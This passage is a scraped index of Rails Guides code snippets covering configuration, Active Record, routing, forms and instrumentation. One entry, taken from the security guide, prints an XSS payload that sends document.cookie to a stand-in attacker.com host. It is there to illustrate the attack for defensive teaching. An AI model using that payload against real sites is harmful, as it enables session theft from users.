%>\">...</div>\n```\n\n----------------------------------------\n\nTITLE: Updating set_author Method to Use Configurable Class\nDESCRIPTION: Ruby code to update the set_author method to use the configurable author_class setting with constantize.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nself.author = Blorgh.author_class.constantize.find_or_create_by(name: author_name)\n```\n\n----------------------------------------\n\nTITLE: Setting production log level in Rails 4.2\nDESCRIPTION: Configuration to preserve the current default log level (:info) in production for Rails 4.2 applications, as Rails 5.0 will change the default to :debug.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_67\n\nLANGUAGE: ruby\nCODE:\n```\n# Set to `:info` to match the current default, or set to `:debug` to opt-into\n# the future default.\nconfig.log_level = :info\n```\n\n----------------------------------------\n\nTITLE: Generating Base Model for Single Table Inheritance in Rails\nDESCRIPTION: Command to generate a Vehicle model with a type field that will serve as the base for Single Table Inheritance (STI) classes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_71\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model vehicle type:string color:string price:decimal{10.2}\n```\n\n----------------------------------------\n\nTITLE: Configuring Microsoft Azure Storage Service\nDESCRIPTION: YAML configuration for setting up Microsoft Azure Storage as an Active Storage service.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nazure:\n  service: AzureStorage\n  storage_account_name: your_account_name\n  storage_access_key: <%= Rails.application.credentials.dig(:azure_storage, :storage_access_key) %>\n  container: your_container_name-<%= Rails.env %>\n```\n\n----------------------------------------\n\nTITLE: EXPLAIN with Options Output (PostgreSQL)\nDESCRIPTION: This is an example of the verbose output generated by running `explain` with the `:analyze` and `:verbose` options on PostgreSQL. The output includes execution times, row counts, and other details about each step in the query plan.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_216\n\nLANGUAGE: sql\nCODE:\n```\nEXPLAIN (ANALYZE, VERBOSE) SELECT \"shop_accounts\".* FROM \"shop_accounts\" INNER JOIN \"customers\" ON \"customers\".\"id\" = \"shop_accounts\".\"customer_id\" WHERE \"shop_accounts\".\"id\" = $1 [[\"id\", 1]]\n                                                                   QUERY PLAN\n------------------------------------------------------------------------------------------------------------------------------------------------\n Nested Loop  (cost=0.30..16.37 rows=1 width=24) (actual time=0.003..0.004 rows=0 loops=1)\n   Output: shop_accounts.id, shop_accounts.customer_id, shop_accounts.customer_carrier_id\n   Inner Unique: true\n   ->  Index Scan using shop_accounts_pkey on public.shop_accounts  (cost=0.15..8.17 rows=1 width=24) (actual time=0.003..0.003 rows=0 loops=1)\n         Output: shop_accounts.id, shop_accounts.customer_id, shop_accounts.customer_carrier_id\n         Index Cond: (shop_accounts.id = '1'::bigint)\n   ->  Index Only Scan using customers_pkey on public.customers  (cost=0.15..8.17 rows=1 width=8) (never executed)\n         Output: customers.id\n         Index Cond: (customers.id = shop_accounts.customer_id)\n         Heap Fetches: 0\n Planning Time: 0.063 ms\n Execution Time: 0.011 ms\n(12 rows)\n```\n\n----------------------------------------\n\nTITLE: Example Payload for process_action.action_controller Hook in Ruby\nDESCRIPTION: Illustrates an example Ruby Hash payload for the `process_action.action_controller` notification, which fires after an action has been processed. It contains comprehensive information including controller, action, parameters, headers, format, method, path, the `ActionDispatch::Request` object, the `ActionDispatch::Response` object, HTTP status code, view rendering time (ms), and database query time (ms).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  controller: \"PostsController\",\n  action: \"index\",\n  params: {\"action\" => \"index\", \"controller\" => \"posts\"},\n  headers: #<ActionDispatch::Http::Headers:0x0055a67a519b88>,\n  format: :html,\n  method: \"GET\",\n  path: \"/posts\",\n  request: #<ActionDispatch::Request:0x00007ff1cb9bd7b8>,\n  response: #<ActionDispatch::Response:0x00007f8521841ec8>,\n  status: 200,\n  view_runtime: 46.848,\n  db_runtime: 0.157\n}\n```\n\n----------------------------------------\n\nTITLE: Loading Rails Frameworks\nDESCRIPTION: The rails/all.rb file that loads all the individual Rails frameworks, making them available to the application. Each framework is required conditionally to handle missing dependencies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"rails\"\n\n%w(\n  active_record/railtie\n  active_storage/engine\n  action_controller/railtie\n  action_view/railtie\n  action_mailer/railtie\n  active_job/railtie\n  action_cable/engine\n  action_mailbox/engine\n  action_text/engine\n  rails/test_unit/railtie\n).each do |railtie|\n  begin\n    require railtie\n  rescue LoadError\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Named Base Generator Implementation\nDESCRIPTION: Generator class inheriting from NamedBase with source_root configuration\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nclass InitializerGenerator < Rails::Generators::NamedBase\n  source_root File.expand_path(\"templates\", __dir__)\nend\n```\n\n----------------------------------------\n\nTITLE: Advanced Cookie Theft via XSS\nDESCRIPTION: More sophisticated XSS attack that sends stolen cookies to an attacker's server.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_41\n\nLANGUAGE: html\nCODE:\n```\n<script>document.write('<img src=\"http://www.attacker.com/' + document.cookie + '\">');</script>\n```\n\n----------------------------------------\n\nTITLE: Running Rails Tests\nDESCRIPTION: This bash command executes the Rails test suite or a specific test file. The output shows the test results, including the number of runs, assertions, failures, errors, and skips.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_125\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test test/models/product_test.rb\n```\n\n----------------------------------------\n\nTITLE: Loading Configuration Files with Rails::Application.config_for\nDESCRIPTION: This YAML snippet demonstrates the structure of a configuration file (e.g., `config/payment.yml`) used with `Rails::Application.config_for`. It defines configurations for `production` and `development` environments, including settings such as `merchant_id`, `public_key`, and `private_key`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_114\n\nLANGUAGE: yaml\nCODE:\n```\n# config/payment.yml\nproduction:\n  environment: production\n  merchant_id: production_merchant_id\n  public_key:  production_public_key\n  private_key: production_private_key\n\ndevelopment:\n  environment: sandbox\n  merchant_id: development_merchant_id\n  public_key:  development_public_key\n  private_key: development_private_key\n```\n\n----------------------------------------\n\nTITLE: Initializing Rails Application\nDESCRIPTION: The Rails::Application#initialize! method that initializes the application. It ensures the application is only initialized once and runs all initializers for the specified group.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\ndef initialize!(group = :default) # :nodoc:\n  raise \"Application has been already initialized.\" if @initialized\n  run_initializers(group, self)\n  @initialized = true\n  self\nend\n```\n\n----------------------------------------\n\nTITLE: Adding a File Upload Field to the Product Form - ERB\nDESCRIPTION: This snippet adds a file upload field to the product form for uploading a featured image using Active Storage. The `form.file_field` helper generates the necessary HTML, and the `accept` attribute restricts the accepted file types to images.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_84\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: product do |form| %>\n  <%# ... %>\n\n  <div>\n    <%= form.label :featured_image, style: \"display: block\" %>\n    <%= form.file_field :featured_image, accept: \"image/*\" %>\n  </div>\n\n  <div>\n    <%= form.submit %>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Assigning Associated Account via account= - Ruby\nDESCRIPTION: Sets the association between a Supplier and an Account object using account=. Sets the appropriate foreign key pointers but does not persist until a save is called. Standard Rails code pattern.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\n@supplier.account = @account\n```\n\n----------------------------------------\n\nTITLE: Template Collection Cache Comment Example\nDESCRIPTION: This snippet demonstrates how to use a special comment format to enable collection caching when the partial template doesn't start with a clean cache call.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_20\n\nLANGUAGE: html\nCODE:\n```\n<%# Template Collection: notification %>\n<% my_helper_that_calls_cache(some_arg, notification) do %>\n  <%= notification.name %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Block-based Association Attribute Setting\nDESCRIPTION: Demonstrates setting attributes on singular associations using blocks after instance initialization\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  has_one :account\nend\n\nuser.build_account{ |a| a.credit_limit = 100.0 }\n```\n\n----------------------------------------\n\nTITLE: Indexing Enumerable with index_with in Ruby\nDESCRIPTION: This code shows how the `index_with` method added to the Enumerable class generates a hash with the elements of the enumerable as keys. The values can either be default values or returned by a block passed to each element.  Defined in `active_support/core_ext/enumerable.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_111\n\nLANGUAGE: ruby\nCODE:\n```\npost = Post.new(title: \"hey there\", body: \"what's up?\")\n\n%i( title body ).index_with { |attr_name| post.public_send(attr_name) }\n# => { title: \"hey there\", body: \"what's up?\" }\n\nWEEKDAYS.index_with(Interval.all_day)\n# => { monday: [ 0, 1440 ], … }\n```\n\n----------------------------------------\n\nTITLE: Appending Redirect URL Filter in Rails Application Configuration (Ruby)\nDESCRIPTION: This snippet shows how to insert a specific string (e.g., \"s3.amazonaws.com\") into the config.filter_redirect array in a Rails application. URLs matching this string will be filtered out from logs or displayed locations, supporting application privacy and compliance. This operation requires access to Rails configuration objects, generally within an environment initializer or the main application configuration file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.filter_redirect << \"s3.amazonaws.com\"\n\n```\n\n----------------------------------------\n\nTITLE: Dynamically Defining Class Methods with class_eval and Example Comments - Ruby\nDESCRIPTION: Demonstrates using class_eval with string interpolation to dynamically define a class method, accompanied by a commented-out example for clarity in documentation. This pattern is used for meta-programming in Ruby, especially inside Rails model code generation. Requires access to the self.class_eval method, and interpolated variables such as method_id. The comments offer maintainers an explicit static example of the resulting code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\n# def self.find_by_login_and_activated(*args)\n#   options = args.extract_options!\n#   ...\n# end\nself.class_eval %{\n  def self.#{method_id}(*args)\n    options = args.extract_options!\n    ...\n  end\n}, __FILE__, __LINE__\n```\n\n----------------------------------------\n\nTITLE: Styling Direct Upload Elements with CSS\nDESCRIPTION: This CSS snippet provides styles for the direct upload elements, including progress bars and status indicators.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_71\n\nLANGUAGE: css\nCODE:\n```\n.direct-upload {\n  display: inline-block;\n  position: relative;\n  padding: 2px 4px;\n  margin: 0 3px 3px 0;\n  border: 1px solid rgba(0, 0, 0, 0.3);\n  border-radius: 3px;\n  font-size: 11px;\n  line-height: 13px;\n}\n\n.direct-upload--pending {\n  opacity: 0.6;\n}\n\n.direct-upload__progress {\n  position: absolute;\n  top: 0;\n  left: 0;\n  bottom: 0;\n  opacity: 0.2;\n  background: #0076ff;\n  transition: width 120ms ease-out, opacity 60ms 60ms ease-in;\n  transform: translate3d(0, 0, 0);\n}\n\n.direct-upload--complete .direct-upload__progress {\n  opacity: 0.4;\n}\n\n.direct-upload--error {\n  border-color: red;\n}\n\ninput[type=file][data-direct-upload-url][disabled] {\n  display: none;\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Active Record Scope Definition in Ruby\nDESCRIPTION: Demonstrates how to update the syntax for defining scopes in Active Record models to use a callable object (Proc or lambda) as required in Rails 4.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_90\n\nLANGUAGE: ruby\nCODE:\n```\nscope :active, where(active: true)\n\n# becomes\nscope :active, -> { where active: true }\n```\n\n----------------------------------------\n\nTITLE: Creating a Join Table with Custom Column Options\nDESCRIPTION: This code snippet creates a join table and overrides the default `:null` option for the columns. The `column_options` are set to `{ null: true }`, allowing null values in the `category_id` and `product_id` columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\ncreate_join_table :products, :categories, column_options: { null: true }\n```\n\n----------------------------------------\n\nTITLE: Applying Custom Validators in ActiveModel and ActiveRecord\nDESCRIPTION: Shows how to apply custom validators in both plain Ruby classes with ActiveModel::Validations and in ActiveRecord models. The example demonstrates using both built-in validation options and custom validators.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  include ActiveModel::Validations\n  attr_accessor :title\n  validates :title, :presence => true, :title => true\nend\n\n# Or for Active Record\n\nclass Person < ActiveRecord::Base\n  validates :title, :presence => true, :title => true\nend\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Total of Grouped Items in Rails\nDESCRIPTION: This SQL query is generated to count the number of records in each group, using `COUNT(*)` and grouping by the `status` column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_96\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT (*) AS count_all, status AS status\nFROM orders\nGROUP BY status\n```\n\n----------------------------------------\n\nTITLE: Setting Flash Message on Logout - Ruby\nDESCRIPTION: This example shows how to set a flash message when a user logs out. The flash message is stored in the `flash` hash with the key `:notice` and will be displayed on the next request after redirection to the root URL. A `status: :see_other` is also set for the redirect.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nclass SessionsController < ApplicationController\n  def destroy\n    session.delete(:current_user_id)\n    flash[:notice] = \"You have successfully logged out.\"\n    redirect_to root_url, status: :see_other\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rails About Command Output\nDESCRIPTION: Example output of the Rails about command showing environment information.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails about\nAbout your application's environment\nRails version             8.1.0\nRuby version              3.2.0 (x86_64-linux)\nRubyGems version          3.3.7\nRack version              3.0.8\nJavaScript Runtime        Node.js (V8)\nMiddleware:               ActionDispatch::HostAuthorization, Rack::Sendfile, ActionDispatch::Static, ActionDispatch::Executor, ActionDispatch::ServerTiming, ActiveSupport::Cache::Strategy::LocalCache::Middleware, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, ActionDispatch::RemoteIp, Sprockets::Rails::QuietAssets, Rails::Rack::Logger, ActionDispatch::ShowExceptions, WebConsole::Middleware, ActionDispatch::DebugExceptions, ActionDispatch::ActionableExceptions, ActionDispatch::Reloader, ActionDispatch::Callbacks, ActiveRecord::Migration::CheckPending, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ContentSecurityPolicy::Middleware, ActionDispatch::PermissionsPolicy::Middleware, Rack::Head, Rack::ConditionalGet, Rack::ETag, Rack::TempfileReaper\nApplication root          /home/foobar/my_app\nEnvironment               development\nDatabase adapter          sqlite3\nDatabase schema version   20180205173523\n```\n\n----------------------------------------\n\nTITLE: Registering Per-Transaction Callbacks in Rails\nDESCRIPTION: This example showcases how to register transactional callbacks (e.g., `after_commit`) directly on an `ActiveRecord::Transaction` object, allowing for actions that are specific to a unit of work rather than a specific model. This is useful for tasks like sending notifications after an article is successfully published within a transaction. The `transaction` block yields an object on which you can register callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nArticle.transaction do |transaction|\n  article.update(published: true)\n\n  transaction.after_commit do\n    PublishNotificationMailer.with(article: article).deliver_later\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using Message Verifiers\nDESCRIPTION: Example of generating and verifying signed messages using Rails message verifiers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nsigned_token = Rails.application.message_verifier(:remember_me).generate(token)\nRails.application.message_verifier(:remember_me).verify(signed_token) # => token\n\nRails.application.message_verifier(:remember_me).verify(tampered_token)\n# raises ActiveSupport::MessageVerifier::InvalidSignature\n```\n\n----------------------------------------\n\nTITLE: Naming Routes with :as Option (Ruby)\nDESCRIPTION: Defines a named route using the `:as` option, creating `logout_path` and `logout_url` helpers. This maps the \"/exit\" path to the `destroy` action of the `SessionsController`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nget \"exit\", to: \"sessions#destroy\", as: :logout\n```\n\n----------------------------------------\n\nTITLE: Implementing Conditional Nested Attributes with reject_if in Ruby on Rails\nDESCRIPTION: Shows how to specify validation requirements for new records added via nested attributes using the :reject_if option with a proc that evaluates the attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\naccepts_nested_attributes_for :author,\n  :reject_if => proc { |attributes| attributes['name'].blank? }\n```\n\n----------------------------------------\n\nTITLE: Configuring I18n Locale Enforcement\nDESCRIPTION: Configuration for I18n available locales enforcement setting\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.i18n.enforce_available_locales = false\n```\n\n----------------------------------------\n\nTITLE: Creating New Rails 3.2 Application\nDESCRIPTION: Command-line instructions for creating a new Rails 3.2 application using the rails new command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n# You should have the 'rails' RubyGem installed\n$ rails new myapp\n$ cd myapp\n```\n\n----------------------------------------\n\nTITLE: Implementing Form with Direct Upload in Rails\nDESCRIPTION: Demonstrates how to implement a form that retains uploads when validation fails by using direct uploads and hidden fields. This approach stores the uploaded file's signed_id in a hidden field.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_39\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.hidden_field :avatar, value: @user.avatar.signed_id if @user.avatar.attached? %>\n<%= form.file_field :avatar, direct_upload: true %>\n```\n\n----------------------------------------\n\nTITLE: Using Yield in Layouts (Multiple Yields)\nDESCRIPTION: This code snippet demonstrates how to create a layout with multiple yielding regions. The main body of the view will render into the unnamed `yield`, while content can be rendered into named `yield` blocks using `content_for`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_66\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <head>\n    <%= yield :head %>\n  </head>\n  <body>\n    <%= yield %>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Restricting Routes with ':except' in Rails Resources\nDESCRIPTION: Demonstrates how to exclude specific routes from being created by `resources` using the `:except` option. This example excludes the `destroy` route, meaning a `DELETE` request to `/photos/:id` will not be matched.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos, except: :destroy\n```\n\n----------------------------------------\n\nTITLE: HTML output of nested form with pre-built addresses in Rails\nDESCRIPTION: This HTML shows the output of the nested form when the controller pre-builds two address records.  The `name` attributes use array-like syntax `person[addresses_attributes][0][kind]` to associate the address attributes with the parent `Person` object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_79\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/people\" accept-charset=\"UTF-8\" method=\"post\"><input type=\"hidden\" name=\"authenticity_token\" value=\"lWTbg-4_5i4rNe6ygRFowjDfTj7uf-6UPFQnsL7H9U9Fe2GGUho5PuOxfcohgm2Z-By3veuXwcwDIl-MLdwFRg\" autocomplete=\"off\">\n  Addresses:\n  <ul>\n      <li>\n        <label for=\"person_addresses_attributes_0_kind\">Kind</label>\n        <input type=\"text\" name=\"person[addresses_attributes][0][kind]\" id=\"person_addresses_attributes_0_kind\">\n\n        <label for=\"person_addresses_attributes_0_street\">Street</label>\n        <input type=\"text\" name=\"person[addresses_attributes][0][street]\" id=\"person_addresses_attributes_0_street\">\n        ...\n      </li>\n\n      <li>\n        <label for=\"person_addresses_attributes_1_kind\">Kind</label>\n        <input type=\"text\" name=\"person[addresses_attributes][1][kind]\" id=\"person_addresses_attributes_1_kind\">\n\n        <label for=\"person_addresses_attributes_1_street\">Street</label>\n        <input type=\"text\" name=\"person[addresses_attributes][1][street]\" id=\"person_addresses_attributes_1_street\">\n        ...\n      </li>\n  </ul>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Using async_count with Active Record - Ruby on Rails - Ruby\nDESCRIPTION: Compares synchronous and asynchronous counting in ActiveRecord queries. The 'async_count' method returns a promise object, allowing the query to execute in the background and retrieve the result later, improving performance for heavy aggregate queries. Requires Rails with async query support, typically using a threaded or concurrent backend.\n\n- Dependencies: Rails >= 7.1, compatible DB adapter\n- Parameters: ActiveRecord query conditions\n- Input: Query (e.g., Post.where(published: true))\n- Output: Promise for count, resolved with .value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n# Synchronous count\npublished_count = Post.where(published: true).count # => 10\n\n# Asynchronous count\npromise = Post.where(published: true).async_count # => #<ActiveRecord::Promise status=pending>\npromise.value # => 10\n```\n\n----------------------------------------\n\nTITLE: Registering Action Mailer Interceptors in Ruby\nDESCRIPTION: This code snippet registers an interceptor, `MailInterceptor`, which will be called before mail is sent. Interceptors can be used to modify the mail message before it's delivered.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.interceptors = [\"MailInterceptor\"]\n```\n\n----------------------------------------\n\nTITLE: Configuring SHA-256 for Active Record Encryption in Rails 7.1\nDESCRIPTION: Configuration example showing how to configure SHA-256 for Active Record Encryption in Rails 7.1, which is necessary if you used SHA-256 in Rails 7.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.encryption.hash_digest_class = OpenSSL::Digest::SHA256\n```\n\n----------------------------------------\n\nTITLE: Displaying Inventory or Subscription Form (ERB)\nDESCRIPTION: This code snippet creates a partial view that displays either the current inventory count or a subscription form if the product is out of stock. It uses Rails form helpers to create the form.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_104\n\nLANGUAGE: erb\nCODE:\n```\n<% if product.inventory_count? %>\n  <p><%= product.inventory_count %> in stock</p>\n<% else %>\n  <p>Out of stock</p>\n  <p>Email me when available.</p>\n\n  <%= form_with model: [product, Subscriber.new] do |form| %>\n    <%= form.email_field :email, placeholder: \"you@example.com\", required: true %>\n    <%= form.submit \"Submit\" %>\n  <% end %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Configure Action Mailbox Routing\nDESCRIPTION: This snippet shows how to configure routing in `application_mailbox.rb` to direct incoming emails to specific mailboxes based on regular expressions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n# app/mailboxes/application_mailbox.rb\nclass ApplicationMailbox < ActionMailbox::Base\n  routing(/^save@/i     => :forwards)\n  routing(/@replies\\./i => :replies)\nend\n```\n\n----------------------------------------\n\nTITLE: Updating Article Association to Use Configurable Class\nDESCRIPTION: Ruby code to update the belongs_to association in the Article model to use the configurable author_class setting.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nbelongs_to :author, class_name: Blorgh.author_class\n```\n\n----------------------------------------\n\nTITLE: Database-driven STI Type Preloading\nDESCRIPTION: Configuration to preload STI types by querying the database for distinct type values.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/preload_stis.rb\n\nunless Rails.application.config.eager_load\n  Rails.application.config.to_prepare do\n    types = Shape.unscoped.select(:type).distinct.pluck(:type)\n    types.compact.each(&:constantize)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Excluding Elements from Array with excluding in Ruby\nDESCRIPTION: This snippet demonstrates the `excluding` method, returning a new array with the specified elements removed.  It is an optimized version of Enumerable#excluding for Arrays. Defined in `active_support/core_ext/array/access.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_120\n\nLANGUAGE: ruby\nCODE:\n```\n[\"David\", \"Rafael\", \"Aaron\", \"Todd\"].excluding(\"Aaron\", \"Todd\") # => [\"David\", \"Rafael\"]\n[ [ 0, 1 ], [ 1, 0 ] ].excluding([ [ 1, 0 ] ])                  # => [ [ 0, 1 ] ]\n```\n\n----------------------------------------\n\nTITLE: Joining Tables with Raw SQL (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `joins` method with raw SQL to specify the `JOIN` clause.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_137\n\nLANGUAGE: ruby\nCODE:\n```\nAuthor.joins(\"INNER JOIN books ON books.author_id = authors.id AND books.out_of_print = FALSE\")\n```\n\n----------------------------------------\n\nTITLE: Configuring Development Environment for Rails 3.2\nDESCRIPTION: This snippet shows new configuration settings to be added to the development environment file in Rails 3.2. It includes settings for mass assignment protection and query plan logging.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_101\n\nLANGUAGE: ruby\nCODE:\n```\n# Raise exception on mass assignment protection for Active Record models\nconfig.active_record.mass_assignment_sanitizer = :strict\n\n# Log the query plan for queries taking more than this (works\n# with SQLite, MySQL, and PostgreSQL)\nconfig.active_record.auto_explain_threshold_in_seconds = 0.5\n```\n\n----------------------------------------\n\nTITLE: Parsing the Rack Configuration File\nDESCRIPTION: The Rack::Builder methods for loading and parsing configuration files. This is used to interpret the config.ru file and build the Rack application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rack\n  class Builder\n    def self.load_file(path, **options)\n      # ...\n      new_from_string(config, path, **options)\n    end\n\n    # ...\n\n    def self.new_from_string(builder_script, path = \"(rackup)\", **options)\n      builder = self.new(**options)\n\n      # We want to build a variant of TOPLEVEL_BINDING with self as a Rack::Builder instance.\n      # We cannot use instance_eval(String) as that would resolve constants differently.\n      binding = BUILDER_TOPLEVEL_BINDING.call(builder)\n      eval(builder_script, binding, path)\n\n      builder.to_app\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Multiple HTTP Methods for Collection Routes in Ruby on Rails\nDESCRIPTION: Shows how to define a collection route that accepts multiple HTTP methods. This example creates a 'search' route for photos that responds to both GET and POST requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: Ruby\nCODE:\n```\nmap.resources :photos, :collection => { :search => [:get, :post] }\n```\n\n----------------------------------------\n\nTITLE: JavaScript After TypeScript Transpilation\nDESCRIPTION: The result of transpiling TypeScript to JavaScript, showing how type annotations are removed. This demonstrates the output of transpilation that browsers can natively understand.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_23\n\nLANGUAGE: javascript\nCODE:\n```\nconst greet = (name) => {\n  console.log(`Hello, ${name}!`);\n};\n```\n\n----------------------------------------\n\nTITLE: Updating the Main Branch in Git for Rails Backporting\nDESCRIPTION: Commands to ensure the main branch is up to date before beginning the backporting process. This uses git checkout to switch to the main branch and git pull with rebase to update it with the latest changes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_47\n\nLANGUAGE: bash\nCODE:\n```\n$ git checkout main\n$ git pull --rebase\n```\n\n----------------------------------------\n\nTITLE: Example Cache Prune Payload in MemoryStore\nDESCRIPTION: Example of a payload structure for cache_prune.active_support event which is emitted when pruning the cache in MemoryStore, containing the store, target size, and current size information.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  store: \"ActiveSupport::Cache::MemoryStore\",\n  key: 5000,\n  from: 9001\n}\n```\n\n----------------------------------------\n\nTITLE: Using errors.clear Method in Ruby on Rails\nDESCRIPTION: This example demonstrates how to use the errors.clear method to intentionally clear the errors collection, and shows its behavior with subsequent validations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_74\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, presence: true, length: { minimum: 3 